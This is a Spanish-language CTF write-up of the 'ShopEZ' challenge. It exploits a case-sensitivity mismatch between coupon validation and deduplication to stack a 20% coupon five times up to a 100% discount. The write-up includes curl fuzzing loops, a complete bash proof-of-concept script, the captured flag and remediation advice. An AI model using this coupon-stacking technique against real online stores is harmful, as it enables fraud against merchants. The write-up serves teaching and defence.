# 🛒 ShopEZ

> Business Logic: apilar cupones jugando con mayúsculas/minúsculas

| Categoría | Dificultad | Autor |
|---|---|---|
| Web / Business Logic | 🟢 Easy | diriartev |

**Flag:** `flag{98f19e4cc686b2db}`

---

## Resumen (TL;DR)

El cupón `WELCOME20` da un 20 % de descuento. El endpoint `/api/apply-coupon` **valida** el código sin distinguir mayúsculas (*case-insensitive*), pero **deduplica** los cupones aplicados distinguiéndolas (*case-sensitive*).

Aplicando cinco variantes del mismo código (`WELCOME20`, `welcome20`, `Welcome20`, `WeLcOmE20`, `WELcOME20`), cada una suma otro 20 % hasta llegar al **100 %**. El checkout exige `total <= 0`, condición que el descuento apilado cumple, y el servidor devuelve la flag.

**Causa raíz:** la validación y la deduplicación usan normalizaciones distintas del string.

| | |
|---|---|
| **Instancia** | `a89fcc6e7a6b2d1d.chal.ctf.ae` (HTTPS) |

## Paso 0 — Preparación

La API es JSON con sesión por cookie. Se usa `curl` con un archivo de cookies:

- `-c cookies.txt` → guarda las cookies del servidor.
- `-b cookies.txt` → las envía (mantiene la sesión).

```bash
B="https://a89fcc6e7a6b2d1d.chal.ctf.ae"
```

## Paso 1 — Reconocimiento

```bash
curl -s -c cookies.txt "$B/api/products"
```

```json
{"products":[
  {"id":1,"name":"Wireless Headphones","price":59.99},
  {"id":2,"name":"USB-C Hub","price":34.99},
  {"id":3,"name":"Mechanical Keyboard","price":89.99},
  {"id":4,"name":"Laptop Stand","price":29.99},
  {"id":5,"name":"Webcam HD","price":44.99}]}
```

Carrito vacío:

```bash
curl -s -b cookies.txt -c cookies.txt "$B/api/cart"
```

```json
{"applied_coupons":[],"cart":[],"discount_amount":0.0,"discount_percent":0.0,"subtotal":0,"total":0.0}
```

> Fíjate en `applied_coupons`: será clave más adelante.

## Paso 2 — Flujo normal (añadir producto)

```bash
curl -s -b cookies.txt -c cookies.txt -X POST "$B/api/cart" \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"quantity":1}'
```

```json
{"cart_size":1,"message":"Added Wireless Headphones to cart"}
```

## Paso 3 — Descubrir el nombre del parámetro del cupón

El campo **no** se llama `code` (responde `{"error":"Missing coupon code"}`). Se hace fuzzing del nombre:

```bash
for p in coupon coupon_code couponcode voucher promo promo_code discount_code coupons; do
  r=$(curl -s -b cookies.txt -c cookies.txt -X POST "$B/api/apply-coupon" \
      -H "Content-Type: application/json" -d "{\"$p\":\"WELCOME20\"}")
  echo "[$p] -> $r"
done
```

```text
[coupon]        -> {"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":47.99}
[coupon_code]   -> {"error":"Missing coupon code"}
[couponcode]    -> {"error":"Missing coupon code"}
[voucher]       -> {"error":"Missing coupon code"}
[promo]         -> {"error":"Missing coupon code"}
[promo_code]    -> {"error":"Missing coupon code"}
[discount_code] -> {"error":"Missing coupon code"}
[coupons]       -> {"error":"Missing coupon code"}
```

> **Lección:** nunca asumas el nombre del parámetro, enuméralo. El correcto es `coupon`.

## Paso 4 — Averiguar la condición de victoria

```bash
curl -s -b cookies.txt -c cookies.txt -X POST "$B/api/checkout" \
  -H "Content-Type: application/json" -d '{}'
```

```json
{"error":"Payment required",
 "message":"Total must be zero or below to complete this promotional checkout.",
 "total":47.99}
```

Objetivo: llevar el total a ≤ 0, es decir, conseguir ≥ 100 % de descuento.

## Paso 5 — Encontrar el fallo de lógica

Aplicar el **mismo** código otra vez está bloqueado:

```bash
curl -s -b cookies.txt -c cookies.txt -X POST "$B/api/apply-coupon" \
  -H "Content-Type: application/json" -d '{"coupon":"WELCOME20"}'
# {"error":"Coupon already applied"}
```

Hipótesis (patrón clásico): la validación es *case-insensitive*, pero la deduplicación compara el string tal cual. Si es así, cada variante de mayúsculas será "nueva" para el dedup pero seguirá validando.

## Paso 6 — Explotación (apilar variantes)

```bash
# Sesión nueva + producto de $59.99
curl -s -c c2.txt "$B/api/cart" >/dev/null
curl -s -b c2.txt -c c2.txt -X POST "$B/api/cart" \
  -H "Content-Type: application/json" -d '{"product_id":1,"quantity":1}' >/dev/null

for v in "WELCOME20" "welcome20" "Welcome20" "WeLcOmE20" "WELcOME20"; do
  r=$(curl -s -b c2.txt -c c2.txt -X POST "$B/api/apply-coupon" \
      -H "Content-Type: application/json" -d "{\"coupon\":\"$v\"}")
  echo "[$v] -> $r"
done
```

| Cupón enviado | Descuento | Total |
|---|---|---|
| `WELCOME20` | 20 % | 47.99 |
| `welcome20` | 40 % | 35.99 |
| `Welcome20` | 60 % | 24.00 |
| `WeLcOmE20` | 80 % | 12.00 |
| `WELcOME20` | **100 %** | **0.00** |

> Las variantes con espacios o tabs (`"WELCOME20 "`) devuelven `Invalid coupon code` porque el servidor hace *trim* antes de comparar. Solo las variantes de mayúsculas evaden la deduplicación.

Estado final del carrito:

```json
{"applied_coupons":["WELCOME20","welcome20","Welcome20","WeLcOmE20","WELcOME20"],
 "cart":[{"id":1,"name":"Wireless Headphones","price":59.99}],
 "discount_amount":59.99,"discount_percent":100.0,"subtotal":59.99,"total":0.0}
```

## Paso 7 — Obtener la flag

```bash
curl -s -b c2.txt -c c2.txt -X POST "$B/api/checkout" \
  -H "Content-Type: application/json" -d '{}'
```

```json
{"flag":"flag{98f19e4cc686b2db}","message":"Order completed!","order_id":"01f8d828","total":0.0}
```

🚩 **FLAG:** `flag{98f19e4cc686b2db}`

## PoC completo

```bash
#!/usr/bin/env bash
# ShopEZ coupon-stacking PoC — autor: diriartev
B="https://a89fcc6e7a6b2d1d.chal.ctf.ae"
CT="-H Content-Type:application/json"

# 1) Sesión nueva
curl -s -c j.txt "$B/api/products" >/dev/null

# 2) Añadir un producto al carrito
curl -s -b j.txt -c j.txt -X POST "$B/api/cart" $CT \
  -d '{"product_id":1,"quantity":1}' >/dev/null

# 3) Apilar 5 variantes de mayúsculas del mismo cupón (20 % c/u -> 100 %)
for c in WELCOME20 welcome20 Welcome20 WeLcOmE20 WELcOME20; do
  curl -s -b j.txt -c j.txt -X POST "$B/api/apply-coupon" $CT \
    -d "{\"coupon\":\"$c\"}" >/dev/null
done

# 4) Checkout con total 0 -> devuelve la flag
curl -s -b j.txt -c j.txt -X POST "$B/api/checkout" $CT -d '{}'
```

## Remediación

- Normalizar el código **una sola vez** (p. ej. `code.strip().upper()`) y usar esa misma forma canónica tanto para validar como para deduplicar `applied_coupons`.
- Forzar en el servidor la exclusividad de cupones (un solo promo por orden).
- Limitar el descuento total al 100 % y rechazar órdenes con total 0 o negativo en lugar de tratarlas como "checkout promocional válido".

## Conclusión

Siempre que veas deduplicación de cupones, códigos de referido, invitaciones o vouchers, hazte la pregunta de oro:

> **¿La validación y la deduplicación usan la MISMA normalización?** (mayúsculas, espacios, Unicode, ceros a la izquierda, punto final)

Si no coinciden, se pueden apilar. Esta clase exacta de bug ha pagado recompensas en programas reales de bug bounty.
